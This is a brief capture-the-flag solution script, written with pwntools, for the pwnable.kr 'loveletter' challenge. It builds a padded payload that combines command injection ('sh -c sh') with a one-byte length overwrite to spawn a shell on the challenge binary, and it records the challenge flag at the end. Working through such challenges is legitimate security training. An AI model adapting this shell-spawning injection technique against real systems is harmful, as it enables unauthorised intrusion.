from pwn import *

after_first_char_command = "a=1 sh -c sh "
exploit = after_first_char_command + ";" 
exploit = exploit + "A" * (254 - len(exploit)) # padding
exploit += "\x01" # number of chars to take from prolog (take only the 'e')
# r = remote("pwnable.kr", 9034)
r = process('./loveletter')
pause()
r.sendline(exploit)
r.interactive()

#flag: 1_Am_3t3rn4l_L0veR